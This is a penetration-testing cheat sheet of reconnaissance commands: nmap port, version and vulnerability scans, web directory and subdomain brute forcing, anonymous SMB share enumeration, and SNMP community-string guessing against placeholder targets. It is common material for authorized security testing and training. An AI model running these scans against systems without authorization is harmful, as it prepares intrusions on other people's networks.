## Recon and Enumeration

### Nmap

```bash
# Fast scan
nmap -T4 -F <IP>

# Full TCP + version + scripts
nmap -sV -sC -p- -T4 <IP> -oN nmap_full.txt

# UDP top ports
nmap -sU --top-ports 200 <IP>

# Vuln scripts
nmap --script vuln <IP>

# OS detection
nmap -O -sV <IP>
```

### Directory Busting

```bash
# gobuster
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50

# ffuf
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302

# feroxbuster recursive
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Subdomain Enumeration

```bash
# subfinder
subfinder -d example.com -o subs.txt

# gobuster vhost
gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsrecon
dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# amass
amass enum -passive -d example.com
```

### SMB

```bash
# Enum shares
smbclient -L //<IP> -N
smbmap -H <IP>

# Connect
smbclient //<IP>/share -N

# Enum users and info
enum4linux -a <IP>
crackmapexec smb <IP>
```

### SNMP

```bash
snmpwalk -c public -v2c <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
```

